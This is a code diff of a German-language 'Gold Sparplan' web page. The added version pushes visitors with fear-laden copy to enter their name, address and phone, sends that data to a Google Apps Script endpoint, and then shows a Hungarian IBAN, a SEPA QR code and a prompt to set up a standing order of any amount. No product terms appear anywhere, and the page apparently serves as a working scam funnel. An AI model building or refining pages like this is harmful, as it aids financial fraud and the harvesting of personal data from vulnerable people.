@@ -1,139 +1,204 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8">
-  <title>Gold Sparplan</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-  <style>
-    body { font-family: Arial, sans-serif; }
-    #loader {
-      display: none;
-      text-align: center;
-      margin-top: 20px;
-    }
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #333;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 10px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Gold Sparplan</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<style>
+body {
+  font-family: Arial;
+  background: #f5f5f5;
+  text-align: center;
+}
+
+.container {
+  max-width: 500px;
+  margin: auto;
+  background: white;
+  padding: 25px;
+  border-radius: 10px;
+}
+
+input {
+  width: 90%;
+  padding: 10px;
+  margin: 5px;
+}
+
+button {
+  padding: 12px;
+  width: 95%;
+  background: black;
+  color: white;
+  border: none;
+  cursor: pointer;
+}
+
+#loader {
+  display:none;
+}
+
+.spinner {
+  border: 4px solid #eee;
+  border-top: 4px solid black;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 1s linear infinite;
+  margin:auto;
+}
+
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+
+.copyBtn {
+  margin-top:5px;
+  padding:5px;
+  font-size:12px;
+}
+</style>
+
 </head>
+
 <body>
 
-<h2>Gold Sparplan</h2>
+<div class="container">
+
+<h2>Schütze dein Vermögen bevor es zu spät ist</h2>
+<p><strong>Das System wird dich nicht retten.</strong><br>
+Sichere dich jetzt selbst ab – in unter 60 Sekunden.</p>
 
 <form id="form">
-  <input type="text" id="vorname" placeholder="Vorname" required><br>
-  <input type="text" id="nachname" placeholder="Nachname" required><br>
-  <input type="text" id="adresse" placeholder="Adresse" required><br>
-  <input type="text" id="telefon" placeholder="Telefon (optional)"><br>
-  <button id="submitBtn" type="submit">Absenden</button>
+<input type="text" id="vorname" placeholder="Vorname" required><br>
+<input type="text" id="nachname" placeholder="Nachname" required><br>
+<input type="text" id="strasse" placeholder="Straße" required><br>
+<input type="text" id="plz" placeholder="PLZ" required><br>
+<input type="text" id="stadt" placeholder="Stadt" required><br>
+<input type="text" id="telefon" placeholder="Telefon (optional)"><br>
+
+<label>
+<input type="checkbox" id="check" required>
+Ich bestätige die Richtigkeit meiner Angaben
+</label><br><br>
+
+<button id="submitBtn">Jetzt absichern</button>
 </form>
 
 <div id="loader">
-  <div class="spinner"></div>
-  <p>Bitte nicht schließen – deine Daten werden verarbeitet...</p>
-  <p><strong>Du wirst gleich zur Zahlungsübersicht weitergeleitet</strong></p>
+<div class="spinner"></div>
+<p>Bitte nicht schließen – wird verarbeitet...</p>
+<p><strong>Du wirst gleich zur Zahlungsübersicht weitergeleitet</strong></p>
 </div>
 
 <div id="result" style="display:none;">
-  <h3>Deine ID:</h3>
-  <p id="kundenId"></p>
 
-  <h3>Zahlung einrichten (QR-Code scannen):</h3>
-  <div id="qrcode"></div>
-  <p><strong>Einfach mit Banking App scannen</strong></p>
-  <p>Verwendungszweck ist bereits korrekt hinterlegt</p>
+<h3>Deine persönliche ID</h3>
+<p id="kundenId"></p>
+<button class="copyBtn" onclick="copyID()">ID kopieren</button>
 
-  <h3>Überweisungsdaten:</h3>
-  <p><strong>Empfänger:</strong> M&M Marketing Kft</p>
-  <p><strong>Bank:</strong> RAIFFEISEN Ungarn</p>
-  <p><strong>IBAN:</strong> HU94120111480189343900200001</p>
-  <p><strong>BIC:</strong> UBRTHUHB</p>
-  <p><strong>Verwendungszweck:</strong> <span id="verwendungszweck"></span></p>
-  <p><strong>Betrag:</strong> frei wählbar</p>
+<h3>QR-Code scannen</h3>
+<div id="qrcode"></div>
+<p><strong>Einfach mit Banking App scannen</strong></p>
+<p>Verwendungszweck ist bereits korrekt hinterlegt</p>
+
+<h3>Überweisungsdaten</h3>
+<p>M&M Marketing Kft</p>
+<p>RAIFFEISEN Ungarn</p>
+
+<p id="iban">HU94120111480189343900200001</p>
+<button class="copyBtn" onclick="copyIBAN()">IBAN kopieren</button>
+
+<p>BIC: UBRTHUHB</p>
+<p>Verwendungszweck: <span id="vwz"></span></p>
+<p>Betrag frei wählbar</p>
+
+<h3>So geht's</h3>
+<p>1. QR-Code scannen<br>
+2. Zahlung prüfen<br>
+3. Dauerauftrag einrichten</p>
+
+</div>
+
 </div>
 
 <script>
+
 const scriptURL = "https://script.google.com/macros/s/AKfycbxLPl5mMATaW1RDBeghbD7DE8xFwkXFsUo4c0yOLul2JCLk5Fl-lIMl8oHjXXHlVvCWrw/exec";
+
 let isSubmitting = false;
 
 function generateID() {
-  const now = new Date();
-  const year = now.getFullYear();
-  const month = String(now.getMonth() + 1).padStart(2, '0');
-  const day = String(now.getDate()).padStart(2, '0');
-  const hours = String(now.getHours()).padStart(2, '0');
-  const minutes = String(now.getMinutes()).padStart(2, '0');
-  return `${year}${month}${day}${hours}${minutes}`;
+  const d = new Date();
+  return d.getFullYear() +
+    String(d.getMonth()+1).padStart(2,'0') +
+    String(d.getDate()).padStart(2,'0') +
+    String(d.getHours()).padStart(2,'0') +
+    String(d.getMinutes()).padStart(2,'0');
 }
 
 function generateSEPA(name, iban, bic, reference) {
   return `BCD\n001\n1\nSCT\n${bic}\n${name}\n${iban}\n\n\n${reference}`;
 }
 
-document.getElementById("form").addEventListener("submit", function(e) {
-  e.preventDefault();
+document.getElementById("form").addEventListener("submit", function(e){
+e.preventDefault();
 
-  if (isSubmitting) return;
-  isSubmitting = true;
+if(isSubmitting) return;
+isSubmitting = true;
 
-  const btn = document.getElementById("submitBtn");
-  btn.disabled = true;
-  btn.innerText = "Wird verarbeitet...";
+document.getElementById("form").style.display="none";
+document.getElementById("loader").style.display="block";
 
-  document.getElementById("loader").style.display = "block";
+const id = generateID();
 
-  const id = generateID();
-  const data = {
-    vorname: document.getElementById("vorname").value,
-    nachname: document.getElementById("nachname").value,
-    adresse: document.getElementById("adresse").value,
-    telefon: document.getElementById("telefon").value,
-    id: id
-  };
+const data = {
+  vorname: document.getElementById("vorname").value,
+  nachname: document.getElementById("nachname").value,
+  strasse: document.getElementById("strasse").value,
+  plz: document.getElementById("plz").value,
+  stadt: document.getElementById("stadt").value,
+  telefon: document.getElementById("telefon").value,
+  id: id
+};
 
-  fetch(scriptURL, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json"
+fetch(scriptURL,{
+  method:"POST",
+  headers:{
+    "Content-Type":"application/json"
   },
-  body: JSON.stringify(data)
+  body:JSON.stringify(data)
 })
-  })
-  .then(() => {
-    document.getElementById("form").style.display = "none";
-    document.getElementById("loader").style.display = "none";
-    document.getElementById("result").style.display = "block";
+.then(()=>{
+  document.getElementById("loader").style.display="none";
+  document.getElementById("result").style.display="block";
 
-    document.getElementById("kundenId").innerText = id;
-    document.getElementById("verwendungszweck").innerText = id;
+  document.getElementById("kundenId").innerText = id;
+  document.getElementById("vwz").innerText = id;
 
-    const sepa = generateSEPA(
-      "M&M Marketing Kft",
-      "HU94120111480189343900200001",
-      "UBRTHUHB",
-      id
-    );
+  const sepa = generateSEPA(
+    "M&M Marketing Kft",
+    "HU94120111480189343900200001",
+    "UBRTHUHB",
+    id
+  );
 
-    new QRCode(document.getElementById("qrcode"), sepa);
-  })
-  .catch(() => {
-    alert("Fehler beim Senden. Bitte erneut versuchen.");
-    isSubmitting = false;
-    btn.disabled = false;
-    btn.innerText = "Absenden";
-    document.getElementById("loader").style.display = "none";
-  });
+  new QRCode(document.getElementById("qrcode"), sepa);
+})
+.catch(()=>{
+  alert("Fehler beim Senden");
 });
+});
+
+function copyIBAN(){
+navigator.clipboard.writeText("HU94120111480189343900200001");
+}
+
+function copyID(){
+navigator.clipboard.writeText(document.getElementById("kundenId").innerText);
+}
+
 </script>
 
 </body>
